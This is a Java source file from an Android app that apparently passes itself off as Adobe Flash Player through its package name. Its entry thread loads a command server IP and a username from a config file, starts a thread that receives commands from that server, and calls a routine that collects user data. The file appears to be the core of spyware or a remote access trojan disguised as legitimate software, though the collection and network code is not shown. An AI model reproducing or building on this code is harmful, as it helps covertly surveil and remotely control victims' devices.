package com.adobe.flashplayer;

import org.json.JSONObject;
import android.content.Context;
import android.os.Message;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

import com.adobe.flashplayer.data.UploadRemainder;
import com.adobe.flashplayer.network.Network;
import com.adobe.flashplayer.network.ServerCommand;
import com.adobe.flashplayer.data.Collection;



public class MainEntry extends Thread{

    private Context context;
    private String path;

    private static String TAG = "[ljg]MainEntry";

    public MainEntry(Context context,String path){
        this.context =context;
        this.path = path;
    }

    @Override
    public  void run() {

        try {
            Log.e(TAG, "[ljg]MainEntry ");

            MyLog.writeLogFile("MainEntry\r\n");

            String uninstall = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.UNINSTALLFLAG);
            if (uninstall.equals("true")) {
                Log.e(TAG, "[ljg]uninstall settled");
                return;
            }

            if (path != null && path.equals("") == false) {
                if (path.endsWith("/") == false) {
                    path += "/";
                }
            }
            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGPLUGINPATH, path);

            PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGPACKAGENAME, context.getPackageName());

            String ip = null;
            String username = null;

            try{
                File file = null;
                file = new File(path + Public.CONFIG_FILENAME);
                int len = (int) file.length();
                byte[] buf = new byte[len];

                FileInputStream fin = new FileInputStream(file);
                fin.read(buf, 0, len);
                fin.close();

                JSONObject json = new JSONObject(new String(buf));
                ip = json.optString("ip");

                if (ip != null && ip.equals("") == false) {
                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
                    Public.SERVER_IP_ADDRESS = ip;
                }
                username = json.optString("username");
                if (username != null && username.equals("") == false) {
                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
                    Public.UserName = username;
                }
            }catch (Exception e){
                e.printStackTrace();
            }

            if (username == null || ip == null) {
                try {
                    InputStream input = context.getAssets().open(Public.CONFIG_FILENAME);
                    int size = input.available();
                    byte buf[] = new byte[size + 1024];
                    input.read(buf, 0, size);
                    input.close();

                    JSONObject json = new JSONObject(new String(buf));
                    ip = json.optString("ip");

                    if (ip != null && ip.equals("") == false) {
                        PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
                        Public.SERVER_IP_ADDRESS = ip;
                    }
                    username = json.optString("username");
                    if (username != null && username.equals("") == false) {
                        PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
                        Public.UserName = username;
                    }
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

            Log.e(TAG,"ip:" + ip + " username:"+username +"\r\n");
            MyLog.writeLogFile("ip:"+ip + " username:"+username + "\r\n");

            Public pubclass = new Public(context);
            Network network = new Network(context);

            try {
                Network.launchServerCmdThread(context);
            } catch (Exception e) {
                e.printStackTrace();
            }

            try {
                Collection.collectUserData(context);
            } catch (Exception e) {
                Log.e(TAG, "[ljg]Collection exception");
                e.printStackTrace();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
